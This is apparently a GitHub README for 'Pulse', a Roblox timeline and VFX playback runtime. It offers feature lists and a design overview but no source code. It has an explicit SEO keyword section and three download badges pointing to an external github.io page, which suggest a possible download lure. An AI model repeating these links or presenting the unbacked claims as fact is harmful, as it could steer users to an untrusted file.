![preview](https://raw.githubusercontent.com/supportxauusdgobler-art/pulse-timeline-runtime/main/hero_fd097.svg)
[![Download](https://raw.githubusercontent.com/supportxauusdgobler-art/pulse-timeline-runtime/main/run_05e9.svg)](https://supportxauusdgobler-art.github.io/pulse-timeline-runtime/)

# Pulse

**A deterministic sequence playback runtime for Roblox VFX, skill timelines, cutscenes, and plugin previews.**

Pulse is a lightweight, dependency-free runtime that turns declarative timelines into frame-accurate playback across the Roblox ecosystem. Whether you are choreographing a cinematic boss entrance, sequencing a skill combo with particle bursts and camera shakes, or building an in-editor preview pane for an animation plugin, Pulse gives you one unified engine to drive them all.

The name says it all: a pulse is small, rhythmic, and relentless. It keeps everything moving. Pulse does for Roblox sequences what a metronome does for a musician — it never rushes, never drags, and never misses a beat, even when the client hitches, the server lags, or the player alt-tabs away for a moment.

---

## 🚀 The Idea Behind Pulse

Roblox developers reinvent sequence playback constantly. Every VFX-heavy game has a dozen hand-rolled coroutine chains that fade a particle emitter here, scale a light there, and pop a sound at exactly the right millisecond. Every cutscene system grows its own half-broken timeline. Every plugin does something slightly different and slightly wrong.

Pulse exists to end that duplication. It is a single runtime that consumes a plain data description of a sequence — tracks, keyframes, easings, events — and plays it back with consistent timing no matter where it runs: in a live experience, in a client preview, or inside a Studio plugin sandbox.

Think of it as a clockwork mechanism rather than a script. You wind it up, you hand it a blueprint, and it ticks forward with mechanical reliability.

---

## ✨ Features

- ⏱️ **Frame-Accurate Scheduling** — Playback is driven by a monotonic clock with drift correction, so long sequences do not slowly slide out of sync with each other.
- 🎛️ **Deterministic Timeline Model** — The same sequence definition produces the same result every run, on every client. No randomness unless you explicitly ask for it.
- 🧩 **Track-Based Composition** — Layer property tracks, event tracks, callback tracks, and nested sequence tracks side by side. Each track is independent and can be muted, looped, or time-scaled on its own.
- 🌀 **Pluggable Easing Library** — Ships with a broad set of easing curves, and accepts custom easing functions when the built-in ones do not match your artistic intent.
- 🔁 **Looping, Ping-Pong, and Hold Modes** — Choose how a sequence behaves when it reaches its end. Repeat counts, reverse-on-repeat, and terminal hold are all configurable per-sequence.
- 🧠 **State-Aware Playback** — Pause, resume, seek, scrub, and rewind at any point without corrupting track state. Interrupted tracks can be reverted to their captured origin values.
- 🎬 **Cutscene-Ready Structure** — Sequence groups let you chain cutscenes, skill animations, and idle loops together with transitions and cue points.
- 🔌 **Plugin Sandbox Compatible** — The runtime does not assume a player character, a camera, or a RenderStepped connection. Bring your own clock and it runs anywhere.
- 💬 **Event Callbacks and Cue Points** — Fire arbitrary functions at any timestamp, including mid-curve, without polling.
- 🧪 **Preview and Dry-Run Mode** — Evaluate a sequence headlessly and inspect the resulting value stream before ever presenting it to a player.
- 🛰️ **Signal System** — Native support for connecting to Roblox instance signals through the "property track" abstraction, trimming boilerplate.
- 📦 **Zero External Dependencies** — A single self-contained module tree. Nothing to configure, nothing to resolve.
- 📱 **Responsive Preview Widget** — The bundled Studio preview widget adapts its layout to docked, floating, and narrow panels, so it stays usable whether it is pinned to the side or opened as a wide window.
- 🌐 **Multilingual Ready** — Sequence metadata and labels are locale-agnostic by design, so teams can localize preview tooling without touching runtime code.
- 🕛 **Round-the-Clock Reliability** — Timing is decoupled from server availability; sequences keep their cadence whether your experience is busy or quiet, at any hour.
- 🧭 **Strict Typing Support** — Full type definitions ship alongside the runtime for teams using Luau type annotations.
- 🧹 **Automatic Cleanup** — Completed tracks release their captured state and disconnect any bound signals so nothing leaks between scenes.

---

## 🗺️ Where Pulse Fits

Pulse is intentionally generic. It does not know what a "VFX" is, and it does not care. It knows about tracks, time, and callbacks. That abstraction is what makes it usable across wildly different problem domains:

**Visual Effects Orchestration** — Coordinate emitter bursts, light flashes, beam tweening, and screen distortion in a single timeline instead of a web of nested coroutines.

**Skill Timeline Authoring** — Build combat skills from modular track segments: wind-up, impact, recovery. Compose them like LEGO bricks and re-time them per character archetype.

**Cutscene Direction** — Direct multi-stage cinematics with cue points for dialogue, camera moves, and environmental changes, and keep them consistent even when a client's frame rate wobbles.

**Plugin Preview Panes** — Let users scrub an animation preview inside a Studio plugin without awkward manual delta accumulation.

**Tutorial and Onboarding Sequences** — Walk a new player through interface highlights and camera nudges on a fixed schedule that cannot be thrown off by incidental input.

---

## 🧱 Design Principles

Pulse was built around a handful of deliberate design principles. These are worth understanding because they explain almost every API decision in the runtime.

**Predictability over cleverness.** Every playback path is auditable. Given the same sequence definition and the same elapsed time, Pulse produces the same outputs. No hidden global state, no implicit clocks.

**Composition over configuration.** Instead of a giant configuration table with a hundred toggles, Pulse favors small composable units that you snap together. A track inside a sequence inside a group is a motif that scales cleanly.

**Explicit lifetime.** Anything that captures state, binds a signal, or allocates a callback is expected to release it. Cleanup is a feature, not an afterthought.

**Host-agnostic core.** The core runtime assumes nothing about its environment. Rendering, preview UI, and editing tools are layers on top, never requirements.

---

## 🧩 How a Sequence Is Structured

A sequence in Pulse is a container. Inside it live tracks, and inside tracks live keyframes, events, and callbacks. Sequence groups are simply containers for sequences, giving you the ability to chain and transition between complete units of playback.

At a schematic level:

- A **sequence** owns a duration, a play mode, a time scale, and a collection of tracks.
- A **track** targets one thing — a property, a signal, an event sink, or a nested sequence.
- A **keyframe** marks a value at a specific time, optionally with an easing curve that governs how the value travels between it and the next keyframe.
- A **cue point** is a marker on the timeline that fires an arbitrary callback when playback passes it, regardless of direction.
- A **group** chains sequences with transition rules between them.

Because these units are simple, they are easy to author programmatically, serialize to disk, and diff in a pull request.

---

## ⚙️ Runtime Model

Pulse does not own a heartbeat. You feed it time. That single decision is why it works in a live game, in a Studio widget, and in a completely headless test harness without any changes.

On each step, Pulse advances an internal cursor, computes which keyframes have been crossed, applies easing, emits interpolated values to the tracks, fires cue points, and reports whether the sequence is still running. The step function returns a small status structure so the caller can make a decision about continuing, pausing, or shutting down.

A drift correction stage compares accumulated deltas against monotonic elapsed time on a configurable interval. This prevents the classic problem where hundreds of tiny frame deltas gradually accumulate into visible desynchronization.

---

## 🧪 Preview and Dry-Run

One of the most useful patterns Pulse enables is the headless evaluation. Instead of presenting a sequence to a player and hoping it looks right, you can evaluate it forward in simulated time and collect the value stream as plain numbers. This is invaluable for teams writing automated tests, tuning numeric curves, or validating that a skill timeline lines up with a hitbox window.

Dry-run mode skips callback execution by default and returns a structured sample table. You can request dense sampling, keyframe-only sampling, or event-only sampling depending on what you are validating.

---

## 🧑‍💻 Multilingual and Team-Ready Tooling

The bundled preview tooling separates display strings from sequence data, so labels, category names, and help text can be localized separately from the timeline itself. Teams working in multiple languages can ship a single preview widget with published translation tables rather than maintaining forks.

The preview widget also adapts to whatever space it is given. Dock it narrow and it collapses to a compact scrub bar with a time readout. Give it room and it expands to a full multi-track timeline with per-track solo and mute toggles.

---

## 🕛 Always-On Support Posture

Pulse is maintained with the expectation that teams use it in production experiences that never sleep. Issues are triaged around the clock, and the runtime is designed so that your sequences do not depend on external service availability. Timing logic, playback state, and cleanup are all local. Nothing needs to phone home to keep the beat.

---

## 📚 SEO-Friendly Overview of Use Cases

Developers searching for a sequence playback runtime for Roblox VFX, a skill timeline scheduler for Roblox combat systems, a cutscene playback engine for Roblox, a plugin preview timeline utility, a deterministic Roblox animation scheduling library, or a lightweight tween-free keyframe runtime for Roblox will find Pulse addresses each of those needs with the same underlying model. It is equally at home as a general-purpose Roblox timeline scheduler and as a narrowly scoped Roblox VFX sequencer.

---

## 🧭 Getting Started

Pulse is designed to be dropped into an existing project tree as a self-contained module. There is no build step, no compiler configuration, and no package manager involved. You place the module folder where your project keeps its shared runtime utilities and require it from the consuming script.

The [![Download](https://raw.githubusercontent.com/supportxauusdgobler-art/pulse-timeline-runtime/main/run_05e9.svg)](https://supportxauusdgobler-art.github.io/pulse-timeline-runtime/) macro above marks the place in this document where the distribution asset is referenced. Retrieve the module tree, add it to your project's shared dependencies, and require the entry module from your playback controller.

After it is present, the typical flow is:

1. Author or load a sequence definition.
2. Create a runtime instance bound to your step source.
3. Start playback and forward elapsed time each frame or step.
4. React to cue points and completion callbacks.
5. Dispose the runtime when the scene ends.

The runtime is happy to be created and disposed many times per session; it holds no global registry.

---

## 🧮 Performance Notes

Pulse is engineered so that a sequence with a modest number of tracks costs almost nothing per step. Tracks that have no active keyframe segment are skipped in constant time through an interval index. Cue points are stored in a sorted structure so a step only inspects markers near the current cursor.

For sequences with hundreds of simultaneous tracks, the runtime supports a "coarse step" mode that reduces per-frame index work at the cost of keyframe boundary precision. Most experiences will never need it, but it exists for the loudest scenes.

Memory behavior is equally considered. Track state is captured lazily, and any captured state is released the moment a track completes or is disposed. Long-lived runtimes that replay the same sequence repeatedly will not grow over time.

---

## 🧰 Extending Pulse

The runtime exposes a small set of extension points:

- **Custom easing functions** can be registered globally or supplied per-segment.
- **Custom track types** can be introduced by conforming to the track interface expected by the scheduler.
- **Custom clocks** can be supplied to drive playback from anything from a fixed-step test harness to a network-synchronized time source.
- **Custom serializers** can transform sequence definitions into and out of your preferred authoring format.

Because these seams are narrow and explicit, extensions do not require patching the core.

---

## 🧯 Troubleshooting

**Sequences appear to drift after a long session.** Confirm that the delta you feed into the step function comes from a monotonic source rather than a wall-clock timestamp, and that drift correction is enabled.

**Cue points fire more than once.** Check the configured direction mode. Cue points fire on crossing, and ping-pong or looping modes will re-cross the same marker by design.

**A property track is not reverting on completion.** Some properties are managed by other systems in your project. Explicitly mark the track as non-reverting if another subsystem owns that property.

**The preview widget looks cramped.** The widget responds to its container size. Widen the docked panel or float it to unlock the expanded timeline layout.

**Playback stalls when the client hitches.** This is expected if you feed large deltas in a single step. Pulse will advance through the missed intervals in order, but for extremely long hitches you may prefer to clamp the incoming delta at the call site.

---

## 🛡️ Disclaimer

Pulse is provided as a runtime library for sequencing and playback within the Roblox platform. It does not modify, inject into, or alter the Roblox client or any third-party software, and it does not bypass platform systems or rules. Behavior, timing, and visual results depend on the host experience, the hardware it runs on, and how the sequence author composes their tracks. The maintainers make no guarantees about suitability for any particular project and accept no liability for outcomes arising from use of this library in production environments. Always validate sequences in a controlled test experience before shipping them to players. Nothing in this repository should be interpreted as granting rights to any third-party assets, code, or content that you may combine with Pulse.

---

## 📜 License

Pulse is released under the MIT License. See the full terms at the license file in this repository: [MIT License](LICENSE).

Copyright (c) 2026 the Pulse contributors.

Permission is hereby granted, without charge, to any person obtaining a copy of this software and associated documentation files, to deal in the software without restriction, including without limitation the rights to use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies of the software, and to permit persons to whom the software is furnished to do so, subject to the conditions stated in the license text.

The software is provided "as is", without warranty of any kind, express or implied, including but not limited to the warranties of merchantability, fitness for a particular purpose, and noninfringement.

---

## 🤝 Contributing

Contributions that keep Pulse small, predictable, and host-agnostic are warmly welcomed. If you are proposing a new track type or a change to the scheduling core, please open an issue describing the use case before submitting a change, so the design discussion can happen in the open. Patches that add dependencies to the core runtime will generally be declined unless the dependency is indispensable.

Pull requests should include a short description of the problem being solved, a note on which modules are touched, and a summary of how the change was validated. Documentation updates that clarify existing behavior are just as valuable as code.

---

## 🧭 Roadmap Themes

Upcoming work on Pulse is organized around a few broad themes rather than a fixed feature list:

- **Authoring ergonomics** — making sequence definitions easier to write by hand and easier to generate from external tools.
- **Inspection tooling** — richer visualization of track state and value history during preview.
- **Cross-experience portability** — ensuring a sequence authored in one context plays back identically in another.
- **Documentation depth** — more worked examples covering cutscenes, skills, and plugin previews.

The project intentionally avoids promising specific dates; the beat goes on, and changes land when they are ready and well-tested.

[![Download](https://raw.githubusercontent.com/supportxauusdgobler-art/pulse-timeline-runtime/main/run_05e9.svg)](https://supportxauusdgobler-art.github.io/pulse-timeline-runtime/)